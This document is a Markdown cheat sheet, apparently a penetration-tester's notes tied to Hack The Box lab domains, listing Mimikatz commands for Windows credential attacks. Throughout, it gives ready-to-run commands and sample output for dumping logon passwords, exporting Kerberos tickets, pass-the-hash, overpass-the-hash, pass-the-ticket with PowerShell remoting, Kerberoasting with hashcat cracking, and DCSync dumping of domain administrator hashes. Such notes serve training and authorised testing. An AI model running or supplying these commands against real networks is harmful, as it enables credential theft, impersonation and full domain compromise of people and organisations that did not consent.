---
tags:
  - windows
  - PtH
  - PtT
  - kerberoasting
  - dcsync
---
# Modules
## Logon Passwords
```powershell
PS > .\mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
```
## Export Tickets
```powershell
PS > .\mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
```
# Pass the Hash
Following are required:
- `/user` to authenticate as
- `/rc4` or `/NTLM` hash of the user's password.
- `/domain` the user to impersonate belongs to. If it's local user account, use the computer name, localhost, or a dot (.).
- `/run` - Program to run with the user's context (default cmd.exe).
```powershell
PS > mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<RC4/NTLM HASH> /domain:<domain> /run:cmd.exe" exit
```

# Pass the Key / OverPass the Hash
## Extract Kerberos Keys
```powershell
PS > .\mimikatz.exe privilege::debug "sekurlsa::ekeys" exit
```

```powershell
PS > mimikatz.exe privilege::debug "/domain:inlanefreight.htb /user:plaintext /ntlm:<HASH>" exit
```

```powershell
PS > mimikatz.exe privilege::debug 'kerberos::ptt "C:\Path\to\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"' exit
```
>**Note:** Instead of opening mimikatz.exe with `cmd.exe` and exiting to get the ticket into the current command prompt, we can use the  `misc` module to launch a new command prompt window with the imported ticket using the `misc::cmd` command.

>**Note:** Mimikatz requires administrative rights for Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

# Powershell Remoting with PtT
```powershell
PS > mimikatz.exe privilege::debug 'kerberos::ptt "C:\Path\to\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"' exit
PS > Enter-PSSession -ComputerName DC01
```
# Kerberoasting
## Extract TGS Ticket from Memory
If the TGS ticket is in memory (from [[SetSPN]] for example), extract it:
```cmd-session
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

<SNIP>
[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgEFoRUbE0lOTEFO
RUZSRUlHSFQuTE9DQUyiOzA5oAMCAQKhMjAwGwhNU1NRTFN2YxskREVWLVBSRS1T
<SNIP>
32UeFiVp60IcdOjV4Mwan6tYpLm2O6uwnvw0J+Fmf5x3Mbyr42RZhgQKcwaSTfXm
LkxPQ0FMqTswOaADAgECoTIwMBsITVNTUUxTdmMbJERFVi1QUkUtU1FMLmlubGFu
ZWZyZWlnaHQubG9jYWw6MTQzMw==
====================
   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
<SNIP>
```
>Without `base64 /out:true` command, it will extract the tickets in `.kirbi` files, with which we can directly skip to `kirbi2john` step.
## Prepare the file for Cracking
- Clean the base64 and convert to `.kirbi`:
```shell-session
$ echo "<base64 blob>" |  tr -d \\n >> encoded_file
$ cat encoded_file | base64 -d > sqldev.kirbi
$ kirbi2john sqldev.kirbi
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs.hashcat
$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb<SNIP>8e71a057feeab
```
## Crack the Hash using [[Hashcat]]
```shell-session
$ hashcat -m 13100 sqldev_tgs.hashcat /usr/share/wordlists/rockyou.txt
```
# DCSync
Mimikatz must be ran in the context of the user who has DCSync privileges and only one user can be attacked at a time.
```cmd-shell
> runas /netonly /user:INLANEFREIGHT\adunn powershell
```
```powershell
PS > .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
... SNIP ...
	NTLM: <NTLM-HASH>
... SNIP ...
```


